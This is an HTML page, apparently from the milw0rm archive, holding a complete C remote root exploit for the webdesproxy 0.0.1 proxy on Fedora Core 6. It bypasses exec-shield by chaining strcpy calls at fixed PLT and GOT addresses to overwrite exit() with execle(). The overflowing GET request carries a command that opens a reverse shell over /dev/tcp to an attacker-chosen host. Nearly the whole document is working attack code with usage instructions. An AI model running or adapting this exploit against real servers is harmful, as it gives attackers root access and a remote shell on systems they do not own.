<html><head><title>webdesproxy 0.0.1 (GET Request) Remote Root Exploit (exec-shield)</title></head><pre>/*
**
** Fedora Core 6 (exec-shield) based
** Webdesproxy (webdesproxy-0.0.1.tgz) remote root exploit
** (reverse connect-back method) by Xpl017Elz
**
** Advanced exploitation in exec-shield (Fedora Core case study)
** URL: http://x82.inetcop.org/h0me/papers/FC_exploit/FC_exploit.txt
**
** vendor: http://webdesproxy.sourceforge.net/
**
** vade79/v9 v9@fakehalo.us (fakehalo/realhalo)'s exploit:
** http://fakehalo.us/xwdp-cygwin.c
**
** --
** exploit by &quot;you dong-hun&quot;(Xpl017Elz), &lt;szoahc@hotmail.com&gt;.
** My World: http://x82.inetcop.org
**
*/
/*
** -=-= POINT! POINT! POINT! POINT! POINT! =-=-
**
** We should focus on uninitialized pb structure variable on .bss.
** This static variable is quite useful. we can put a command to run here.
** We only should be careful for arguments of execle(). 
** A null byte goes after &quot;/bin/sh&quot; and &quot;-c&quot; option in .bss.
**
** --
** execle(&quot;/bin/sh\0&quot;,&quot;/bin/sh\0&quot;,&quot;-c\0&quot;,  conn-back_shell, 0x00000000,     0x00000000);
**                                                        [argument end] [environment ptr]
** --
**
** Also I search for 8bytes of null from stack to define environment variable.
** To get here, I made 13 ret(pop %eip) codes. In case you have different
** stack structure, you may have to change the number of ret code.
** Make sure there are 2 words of null after the arguments and at the position of
** environment pointer.
**
*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netdb.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;sys/socket.h&gt;

/*
** Fedora Core release 6 (Zod)
** 2.6.18-1.2798.fc6 #1
** locale (GNU libc) 2.5
** gcc version 4.1.1 20061011 (Red Hat 4.1.1-30)
** webdesproxy 0.0.1 tarball src compile (webdesproxy-0.0.1.tgz)
*/

#define EXIT_GOT		0x0804b1a8 // exit GOT
#define EXIT_PLT		0x08048bf8 // exit PLT

#define STRCPY_PLT		0x08048b18 // &lt;strcpy@plt&gt;
#define MOVE_ESP		0x0804aa26 // &lt;__libc_csu_init+102&gt;
#define RET_CODE		0x0804aa73 // &lt;_fini+27&gt;:   ret

#define NULL_STR		0x08050a40 // &lt;pb+4096&gt; (null)

#define EXECLE_16_0xff		0x0804b19a // (execle()&gt;&gt;16)&amp;0xff // fork()
#define EXECLE_08_0xff		0x0804b17d // (execle()&gt;&gt;8)&amp;0xff // bind()
#define EXECLE_00_0xff		0x08048a4f // (execle()&gt;&gt;0)&amp;0xff // &lt;read@plt+7&gt;

/* .bss section */
#define BIN_SH_LOC		0x0804fbcb // &lt;pb+395&gt; struct pb pb; // /bin/sh
#define BIN_SH_END		(BIN_SH_LOC)+7 // &lt;pb+402&gt;
#define C_OPTION_LOC		(BIN_SH_LOC)+8 // &lt;pb+403&gt; // -c
#define C_OPTION_END		(BIN_SH_LOC)+10 // &lt;pb+405&gt;
#define CONN_BACK_LOC		(BIN_SH_LOC)+11 // &lt;pb+406&gt; // conn-back shell

#define RET_CODE_COUNT		13

int main(int argc,char *argv[]){
	int i=0,l=0,sock;
	unsigned char ex_buf[4096];

	struct hostent *se;
	struct sockaddr_in saddr;

	memset((char *)ex_buf,0,sizeof(ex_buf));
	printf(&quot;\n Fedora Core 6 (exec-shield) based\n&quot;
		&quot; Webdesproxy (webdesproxy-0.0.1.tgz) remote root exploit\n&quot;
		&quot; by Xpl017Elz\n\n&quot;);

	if(argc&lt;6){
		printf(&quot; Usage: %s [host] [port] [conn-back host] [input port] [output port]\n&quot;,argv[0]);
		printf(&quot; Example: %s webdesproxy.host.co.kr 8080 hax0r.kr 8282 8383\n\n&quot;,argv[0]);
		return -1;
	}

	sprintf(ex_buf,&quot;GET http://&quot;);
	l=strlen(ex_buf);
	for(i=0;i&lt;220;i++){
		ex_buf[l++]=0x78;
	}
	i=0;

	printf(&quot; [+] make execle() address.\n&quot;);
	{
		/* (execle()&gt;&gt;0)&amp;0xff */
		*(long *)&amp;ex_buf[l]=STRCPY_PLT;
		l+=4;
		*(long *)&amp;ex_buf[l]=MOVE_ESP;
		l+=4;
		*(long *)&amp;ex_buf[l]=EXIT_GOT+i++;
		l+=4;
		*(long *)&amp;ex_buf[l]=EXECLE_00_0xff;
		l+=4;
		/* (execle()&gt;&gt;8)&amp;0xff */
		*(long *)&amp;ex_buf[l]=STRCPY_PLT;
		l+=4;
		*(long *)&amp;ex_buf[l]=MOVE_ESP;
		l+=4;
		*(long *)&amp;ex_buf[l]=EXIT_GOT+i++;
		l+=4;
		*(long *)&amp;ex_buf[l]=EXECLE_08_0xff;
		l+=4;
		/* (execle()&gt;&gt;16)&amp;0xff */
		*(long *)&amp;ex_buf[l]=STRCPY_PLT;
		l+=4;
		*(long *)&amp;ex_buf[l]=MOVE_ESP;
		l+=4;
		*(long *)&amp;ex_buf[l]=EXIT_GOT+i++;
		l+=4;
		*(long *)&amp;ex_buf[l]=EXECLE_16_0xff;
		l+=4;
	}
	/* #1 make null byte */
	*(long *)&amp;ex_buf[l]=STRCPY_PLT;
	l+=4;
	*(long *)&amp;ex_buf[l]=MOVE_ESP;
	l+=4;
	*(long *)&amp;ex_buf[l]=BIN_SH_END; // &quot;/bin/sh\0&quot;
	l+=4;
	*(long *)&amp;ex_buf[l]=NULL_STR;
	l+=4;

	/* #2 make null byte */
	*(long *)&amp;ex_buf[l]=STRCPY_PLT;
	l+=4;
	*(long *)&amp;ex_buf[l]=MOVE_ESP;
	l+=4;
	*(long *)&amp;ex_buf[l]=C_OPTION_END; // &quot;-c\0&quot;
	l+=4;
	*(long *)&amp;ex_buf[l]=NULL_STR;
	l+=4;

	printf(&quot; [+] execle() argument align padddding...\n&quot;);
	for(i=0;i&lt;RET_CODE_COUNT;i++){
		*(long *)&amp;ex_buf[l]=RET_CODE; /* ret(pop %eip) code */
		l+=4;
	}

	printf(&quot; [+] make execute command.\n&quot;);
	{
		/*
		** --
		** execle(&quot;/bin/sh&quot;,&quot;/bin/sh&quot;,&quot;-c&quot;,conn-back_shell,0x00000000,0x00000000);
		** --
		*/
		*(long *)&amp;ex_buf[l]=EXIT_PLT; /* exit PLT */
		l+=4;
		*(long *)&amp;ex_buf[l]=0x82828282; /* dummy */
		l+=4;
		*(long *)&amp;ex_buf[l]=BIN_SH_LOC; /* argv[0] */
		l+=4;
		*(long *)&amp;ex_buf[l]=BIN_SH_LOC; /* argv[1] */
		l+=4;
		*(long *)&amp;ex_buf[l]=C_OPTION_LOC; /* argv[2] */
		l+=4;
		*(long *)&amp;ex_buf[l]=CONN_BACK_LOC; /* argv[3] */
		l+=4;
	}

	printf(&quot; [+] make connect-back shell command.\n&quot;);
	{
		/* overwrite .bss section */
		sprintf(ex_buf+l,&quot;/bin/shx-cxsh&lt;/dev/tcp/%s/%d&gt;/dev/tcp/%s/%d;\n&quot;,argv[3],atoi(argv[4]),argv[3],atoi(argv[5]));
		l=strlen(ex_buf);
	}

	printf(&quot; [+] connect host: %s:%d.\n&quot;,argv[1],atoi(argv[2]));
	se=gethostbyname(argv[1]);
	if(se==NULL){
		printf(&quot; [-] gethostbyname() error.\n\n&quot;);
		return -1;
	}
	sock=socket(AF_INET,SOCK_STREAM,0);
	if(sock==-1){
		printf(&quot; [-] socket() error.\n\n&quot;);
		return -1;
	}
	saddr.sin_family=AF_INET;
	saddr.sin_port=htons(atoi(argv[2]));
	saddr.sin_addr=*((struct in_addr *)se-&gt;h_addr);
	bzero(&amp;(saddr.sin_zero),8);

	i=connect(sock,(struct sockaddr *)&amp;saddr,sizeof(struct sockaddr));
	if(i==-1){
		printf(&quot; [-] connect() error.\n\n&quot;);
		return -1;
	}

	printf(&quot; [+] exploit size: %d.\n&quot;,l);
	printf(&quot; [+] send exploit.\n&quot;);
	send(sock,ex_buf,l,0);
	close(sock);

	printf(&quot; [*] checking, your connect-back host. :-}\n\n&quot;);
	exit(0);
}

/* eox */

// milw0rm.com [2007-05-14]</pre></html>